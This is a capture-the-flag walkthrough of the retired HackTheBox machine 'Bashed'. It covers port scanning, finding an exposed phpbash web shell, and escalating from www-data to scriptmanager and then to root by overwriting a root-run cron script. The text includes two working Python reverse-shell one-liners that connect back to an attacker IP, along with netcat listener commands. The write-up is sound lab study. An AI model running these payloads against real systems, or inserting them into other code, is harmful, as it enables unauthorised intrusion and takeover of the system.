This is a retired beginner-level box from hackthebox. I got stuck when I did it because I really overthought it, it is much simpler than you think. I am practicing with Retired HacktheBox Machines.

### Scanning:

Find running services, using nmap, ping sweep didn't work switched to stealth scan:

```
crazyeights@es-base:~$ nmap -PS 10.10.10.68
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 13:53 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.09 seconds

crazyeights@es-base:~$ sudo nmap -sS 10.10.10.68
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
```

### Web:

Index Page:

Read the first post, and you will find that there is a web shell tool hosted somewhere on the server. If we find it we can try to get a reverse shell.

##### Enumeration:

```
crazyeights@es-base:~$ dirb http://10.10.10.68

### PHP Bash:

The phpbash web shell can be found in the folder dev:

![](/assets/images/22/s3.png)

Tried running several commands

![](/assets/images/22/s4.png)

*   There seemed to sometype of input sanitization that modified the commands before they were sent to the server (this might also not have been the case, other people didn't seem to have this problem when I looked after, I did a bunch of unecessary stuff to try to get it to work including creating a second webshell)
    
*   Used insomnia to bypasss this
    
Start a listener

```
nc -lvp 1234
```

Request to phpbash.php with insomnia:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### User:

We get a shell:

```
crazyeights@es-base:~$ nc -lvp 1234
listening on [any] 1234 ...

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

There are two users on the machine:

```
$ cd /home
$ ls
arrexel
scriptmanager
```

##### Get user flag:

```
$ cd arrexel
$ ls
user.txt
$ cat user.txt
2c281_i_dont_want_to_get_in_trouble
```

### Root:

Find out if the user www-data can run any commands with elevated privileges:

```
sudo -l
```

www-data can run commands as scriptmanager without a password:

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Spawn a shell as the user scriptmanager:

```
$ sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
scriptmanager@bashed:/var/www$ 
```

*   scriptmanager didnt seem to have an extra permissions

*   Searching for files owned by scriptmanager:

```
scriptmanager@bashed:~$ find / -user scriptmanager 2>/dev/null
find / -user scriptmanager 2>/dev/null
/scripts
/scripts/test.py
/home/scriptmanager
```

*   We find the folder scripts in the root dir. Its location suggests that it may be used for something...
    
*   In the folder we find the file test.txt which is owned by root
    
*   It was also recently modified suggesting there might be a cronjob for this folder:
    

```
scriptmanager@bashed:/scripts$ ls -lia
ls -lia
total 16
393492 drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
     2 drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
402847 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
393805 -rw-r--r--  1 root          root            12 Jan  2 12:05 test.txt
scriptmanager@bashed:/scripts
```

The file test.py must write to the file test.txt every couple minutes (?):

```
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ 


testing 123!scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

*   Since the file test.txt is owned by root the file test.py must be run with root privileges

*   Since we can modify the file test.py we can insert a reverse shell

Start the listener:

```
nc -lvp 9999
```

Insert the reverse shell:

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
```

### Root:

```
crazyeights@es-base:~$ nc -lvp 9999
listening on [any] 9999 ...

 # id
uid=0(root) gid=0(root) groups=0(root)
```

#### Root Flag:

```
 # cd /root
 # ls
root.txt
 # cat root.txt
cc4f_i_dont_want_to_get_in_trouble
 # 
```

###### Finding the cronjob:

```
 # crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
 # 
```

FIN. ðŸ¥³
